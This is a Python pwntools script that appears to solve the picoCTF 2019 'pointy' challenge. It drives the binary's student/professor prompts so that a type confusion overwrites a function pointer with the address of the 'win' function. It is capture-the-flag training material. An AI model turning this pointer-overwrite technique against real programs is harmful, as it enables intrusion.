from pwn import *

binary_path = "/home/yuvaly0/Desktop/pico2019/pointy/vuln"

e = ELF(binary_path)
proc = process(binary_path)

win_function_address = e.symbols['win']


def allocate_stdudent(student_name):
	proc.sendlineafter("Input the name of a student\n", student_name)

def allocate_proffesor(proffesor_name):
	proc.sendlineafter("Input the name of the favorite professor of a student \n", proffesor_name)

def send_student_to_give_score(student_name):
	proc.sendlineafter("Input the name of the student that will give the score \n", student_name)

def send_proffesor_to_be_scored(proffesor_name):
	proc.sendlineafter("Input the name of the professor that will be scored \n", proffesor_name)

def send_score(score):
	proc.sendlineafter("Input the score: \n", score)


allocate_stdudent("s1")
allocate_proffesor("p1")
send_student_to_give_score("s1")
send_proffesor_to_be_scored("s1")
send_score(str(win_function_address))


allocate_stdudent("s2")
allocate_proffesor("p2")
send_student_to_give_score("s1")
send_proffesor_to_be_scored("p2")
send_score(str(100))
print proc.recvline()


